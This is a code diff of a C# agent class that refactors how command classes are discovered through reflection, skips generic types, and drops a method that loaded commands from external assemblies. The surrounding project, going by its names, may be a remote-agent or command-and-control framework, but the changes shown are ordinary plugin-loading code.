@@ -1,4 +1,5 @@
 ﻿using Agent.Commands;
+using Agent.Commands.Services;
 using Agent.Communication;
 using Agent.Service;
 using System;
@@ -23,37 +24,18 @@ namespace Agent.Models
 
         private List<AgentCommand> _commands = new List<AgentCommand>();
 
-        public void LoadCoreAgentCommands()
+        public void LoadCommands()
         {
             var self = Assembly.GetExecutingAssembly();
             foreach (var type in self.GetTypes())
             {
-                if (type.IsSubclassOf(typeof(AgentCommand)))
+                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters)
                 {
                     var instance = Activator.CreateInstance(type) as AgentCommand;
                     _commands.Add(instance);
                 }
             }
 
-        }
-
-        public int LoadCommands(Assembly module)
-        {
-            int count = 0;
-            foreach (var type in module.GetTypes())
-            {
-
-                if (type.IsSubclassOf(typeof(AgentCommand)))
-                {
-                    var instance = Activator.CreateInstance(type) as AgentCommand;
-                    if (!_commands.Any(c => c.Name == instance.Name))
-                    {
-                        _commands.Add(instance);
-                        count++;
-                    }
-                }
-            }
-            return count;
         }
 
         public Agent(AgentMetadata metadata, CommModule commModule)
@@ -65,7 +47,7 @@ namespace Agent.Models
             this._fileService = ServiceProvider.GetService<IFileService>();
             this._proxyService = ServiceProvider.GetService<IProxyService>();
 
-            LoadCoreAgentCommands();
+            LoadCommands();
         }
 
         public void Start()
